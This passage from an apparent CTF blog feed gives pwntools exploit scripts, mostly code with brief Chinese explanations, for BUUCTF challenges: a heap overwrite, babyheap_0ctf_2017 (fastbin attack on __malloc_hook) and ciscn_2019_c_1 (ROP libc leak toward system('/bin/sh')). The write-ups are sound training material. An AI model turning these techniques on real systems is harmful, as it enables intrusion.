punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"amd64"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x64/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc<span class="token punctuation">,</span>libcbase    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>    libcbase <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base <span class="token operator">=</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>r<span class="token punctuation">.</span>_cwd<span class="token operator">+</span>r<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"libc.so.6"</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>            <span class="token keyword">return</span> text_base<span class="token punctuation">,</span>r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base<span class="token punctuation">,</span>libc_base <span class="token operator">=</span> get_base<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    break_point <span class="token operator">=</span> <span class="token string">"set $text_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>text_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token operator">+</span><span class="token string">"set $libc_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>    break_point<span class="token operator">+=</span><span class="token string">"b *"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nc"</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">,</span>break_point<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">" ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>contexe<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Heap : "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"heap:"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>contexe<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Heap : "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"heap : "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>context<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"aa"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span>malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"aa"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"aa"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000006020C0</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>malloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Your choice :"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4869"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu</title>
      <link href="/2020/01/30/buu/"/>
      <url>/2020/01/30/buu/</url>
      
        <content type="html"><![CDATA[<h3 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h3><p>这个题目保护全开，我们分析一下它的数据结构：</p><img src="/2020/01/30/buu/image-20200130134519707.png" title="This is an image"><p>可以看出，在一个程序分配出的地址上，存储了堆块是否被使用的flag,和堆块的size和堆块的内存指针，同时值得注意的是calloc，它和malloc有所不同，它分配的堆块的内容会被清0 。<br><img src="/2020/01/30/buu/image-20200130134818599.png" title="This is an image"></p><p>在fill函数里面，我们很容易看出其存在堆溢出，因为输入的size可以由用户决定。<br><strong>exp</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> LibcSearcherexec_binary <span class="token operator">=</span> <span class="token string">"./babyheap_0ctf_2017"</span>libcversion <span class="token operator">=</span> <span class="token string">'2.23'</span>local <span class="token operator">=</span> <span class="token number">0</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exec_binarycontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exec_binary<span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>exec_binary<span class="token punctuation">)</span>    <span class="token keyword">if</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"i386"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x86/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> context<span class="token punctuation">.</span>arch <span class="token operator">==</span> <span class="token string">"amd64"</span><span class="token punctuation">:</span>        libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/glibc/x64/{}/lib/libc-{}.so"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libcversion<span class="token punctuation">,</span>libcversion<span class="token punctuation">)</span><span class="token punctuation">,</span>checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">29799</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> libc<span class="token punctuation">,</span>libcbase    libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span>str<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>    libcbase <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>addr_name<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">get_base</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base <span class="token operator">=</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>r<span class="token punctuation">.</span>_cwd<span class="token operator">+</span>r<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> key <span class="token keyword">in</span> r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"libc.so.6"</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>            <span class="token keyword">return</span> text_base<span class="token punctuation">,</span>r<span class="token punctuation">.</span>libs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    text_base<span class="token punctuation">,</span>libc_base <span class="token operator">=</span> get_base<span class="token punctuation">(</span>r<span class="token punctuation">)</span>    break_point <span class="token operator">=</span> <span class="token string">"set $text_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>text_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token operator">+</span><span class="token string">"set $libc_base="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span>    break_point<span class="token operator">+=</span><span class="token string">"b *"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\nc"</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">,</span>break_point<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">confirm</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> globals<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> n<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value <span class="token operator">==</span> address<span class="token punctuation">:</span>            <span class="token keyword">return</span> success<span class="token punctuation">(</span>key<span class="token operator">+</span><span class="token string">" ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">calloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>calloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span>calloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>calloc<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>calloc<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>fill<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>calloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#3</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>dump<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span>__libc_start_main_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3a4438</span>confirm<span class="token punctuation">(</span>__libc_start_main_addr<span class="token punctuation">)</span>get_libc<span class="token punctuation">(</span>__libc_start_main_addr<span class="token punctuation">,</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span>malloc_hook_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">)</span>confirm<span class="token punctuation">(</span>malloc_hook_addr<span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> <span class="token number">0x4526a</span> <span class="token operator">+</span> libcbasecalloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>calloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#4</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xa0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>calloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#4</span>calloc<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#5</span>fill<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token operator">+</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token operator">*</span><span class="token string">"A"</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>calloc<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span></code></pre><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><p>普通的栈溢出，但是这个题目有个加密的函数<br><img src="/2020/01/30/buu/image-20200111165559402.png" title="This is an image"></p><p>然后自然要联想到解密嘛，所以我就写了脚本将pyload打进去之前先加密，然后利用程序的异或解密，但是我虽然成功泄露出了地址但是还是没办法getshell，第二个payload打进去的时候好像会被改乱，呜呜呜，而且好像timeout了，所以想别的思路，卡了半天，才发现<strong>strlen()</strong>的”\x00”截断可以帮助break从而跳过加解密，哭了。<br>下面贴一个很混乱的脚本，主要是本地打通，远程一直打不通，地址什么泄露的都没问题，不知道为啥，换了多种方式，最终觉得我不配。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">29846</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#r = process("./ciscn_2019_c_1")</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc6_2.27-3ubuntu1_amd64.so'</span><span class="token punctuation">)</span>file <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ciscn_2019_c_1"</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> <span class="token number">0x000000000400B28</span>__start_addr <span class="token operator">=</span> <span class="token number">0x000000000400710</span>encode_addr <span class="token operator">=</span> <span class="token number">0x0000000004009A0</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your choice!\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input your Plaintext to be encrypted\n"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"------------------------------ leak real addr -------------------------------------------"</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">0x50</span><span class="token operator">+</span><span class="token number">8</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x0000000000400c83</span>payload <span class="token operator">=</span>  <span class="token string">"\x00"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>offset <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"b"</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''payload_list = []for x in range(len(payload)):    payload_list.append(payload[x])#    print payload[x]print payload_listfor x in range(len(payload_list)):    if ord(payload_list[x])&lt;=96 or ord(payload_list[x])>122:        if ord(payload_list[x])&lt;=64 or ord(payload_list[x]) > 90:            if ord(payload_list[x])>47 and ord(payload_list[x])&lt;=57:                payload_list[x] = chr(ord(payload_list[x])^0xf)        else:            payload_list[x] = chr(ord(payload_list[x])^0xe)    else:        payload_list[x] = chr(ord(payload_list[x])^0xd)payload_change = ""for x in range(len(payload_list)):    payload_change+=payload_list[x]log.info(hex(len(payload_change)))print payload_change'''</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Ciphertext\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00\x00"</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#libc = LibcSearcher("puts",puts_addr)</span><span class="token comment" spellcheck="true">#libc_puts = libc.dump('puts')</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span><span class="token comment" spellcheck="true">#libcbase = puts_addr-libc_puts</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"base_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#system_addr = libcbase + libc.dump('system')</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token number">0x04f440</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x1b3e9a</span><span class="token operator">+</span>libcbase<span class="token comment" spellcheck="true">#binsh_addr = libcbase + libc.search("/bin/sh").next()</span><span class="token comment" spellcheck="true">#binsh_addr = libc.dump("str_bin_sh")+libcbase</span>log<span 